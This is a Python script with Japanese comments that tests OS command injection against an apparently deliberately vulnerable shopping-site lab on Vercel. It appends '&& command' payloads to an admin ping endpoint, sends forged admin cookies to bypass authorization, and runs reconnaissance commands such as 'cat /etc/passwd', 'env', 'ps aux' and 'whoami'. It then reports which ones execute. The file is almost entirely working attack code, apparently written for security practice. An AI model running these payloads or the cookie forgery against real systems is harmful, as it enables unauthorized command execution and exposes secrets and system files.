#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Vercel環境でのOSコマンド調査スクリプト
実際にVercelで使用可能なコマンドを特定する
"""

import requests
import urllib.parse

def test_vercel_commands():
    """Vercel環境で使用可能なコマンドを調査"""
    
    base_url = "https://vulnerable-shopping-mall21.vercel.app/admin/system?target="
    
    # テスト対象のコマンド一覧
    test_commands = [
        # 基本コマンド
        "localhost && echo hello",
        "localhost && pwd",
        "localhost && ls",
        "localhost && whoami",
        "localhost && id",
        
        # Python関連
        "localhost && python3 --version",
        "localhost && python --version",
        "localhost && which python3",
        "localhost && which python",
        
        # システム情報
        "localhost && uname -a",
        "localhost && hostname",
        "localhost && date",
        "localhost && env",
        
        # ファイル操作
        "localhost && cat /etc/passwd",
        "localhost && cat /proc/version",
        "localhost && ls -la /",
        "localhost && ls -la /bin",
        "localhost && ls -la /usr/bin",
        
        # プロセス関連
        "localhost && ps",
        "localhost && ps aux",
        "localhost && top -n 1",
        
        # ネットワーク
        "localhost && ping -c 1 8.8.8.8",
        "localhost && nslookup google.com",
        
        # その他
        "localhost && which ls",
        "localhost && which cat",
        "localhost && which echo",
        "localhost && which sh",
        "localhost && /bin/echo hello",
        "localhost && /usr/bin/whoami",
        
        # 環境変数テスト
        "localhost && echo $PATH",
        "localhost && echo $HOME",
        "localhost && echo $USER",
        
        # シェル確認
        "localhost && echo $SHELL",
        "localhost && sh -c 'echo shell works'",
        "localhost && /bin/sh -c 'echo shell works'"
    ]
    
    print("🔍 Vercel環境でのOSコマンド調査開始")
    print("=" * 60)
    
    working_commands = []
    failed_commands = []
    
    for i, cmd in enumerate(test_commands, 1):
        print(f"\n{i:2d}. テスト中: {cmd}")
        
        try:
            # URLエンコード
            encoded_cmd = urllib.parse.quote(cmd)
            url = f"{base_url}{encoded_cmd}"
            
            # リクエスト送信（管理者Cookieも設定）
            cookies = {
                'user_id': '1',
                'username': 'admin',
                'is_admin': 'True',
                'role': 'user'
            }
            
            response = requests.get(url, cookies=cookies, timeout=30)
            
            if response.status_code == 200:
                # レスポンスからPing結果を抽出
                if 'Ping結果:' in response.text:
                    # Ping結果部分を抽出
                    start = response.text.find('<pre class="bg-dark text-light p-3">') + len('<pre class="bg-dark text-light p-3">')
                    end = response.text.find('</pre>', start)
                    
                    if start > 0 and end > start:
                        result = response.text[start:end].strip()
                        
                        # 成功判定
                        if "exit code 127" in result or "No output" in result:
                            print(f"    ❌ 失敗: {result[:100]}...")
                            failed_commands.append(cmd)
                        elif "failed" in result.lower():
                            print(f"    ❌ 失敗: {result[:100]}...")
                            failed_commands.append(cmd)
                        else:
                            print(f"    ✅ 成功: {result[:100]}...")
                            working_commands.append((cmd, result))
                    else:
                        print(f"    ⚠️  レスポンス解析失敗")
                        failed_commands.append(cmd)
                else:
                    print(f"    ⚠️  Ping結果が見つからない")
                    failed_commands.append(cmd)
            else:
                print(f"    ❌ HTTPエラー: {response.status_code}")
                failed_commands.append(cmd)
                
        except Exception as e:
            print(f"    ❌ 例外発生: {str(e)}")
            failed_commands.append(cmd)
    
    # 結果まとめ
    print("\n\n🎉 調査結果まとめ")
    print("=" * 60)
    
    print(f"\n✅ 動作するコマンド ({len(working_commands)}個):")
    print("-" * 40)
    for cmd, result in working_commands:
        print(f"• {cmd}")
        print(f"  → {result[:150]}...")
        print()
    
    print(f"\n❌ 動作しないコマンド ({len(failed_commands)}個):")
    print("-" * 40)
    for cmd in failed_commands:
        print(f"• {cmd}")
    
    print(f"\n📊 成功率: {len(working_commands)}/{len(test_commands)} ({len(working_commands)/len(test_commands)*100:.1f}%)")
    
    # 動作するコマンドがあれば詳細レポート生成
    if working_commands:
        print("\n📝 Vercel環境で利用可能なコマンド詳細:")
        print("=" * 60)
        
        for cmd, result in working_commands:
            print(f"\n🔧 コマンド: {cmd}")
            print(f"📤 出力:")
            print(result)
            print("-" * 40)

if __name__ == "__main__":
    test_vercel_commands()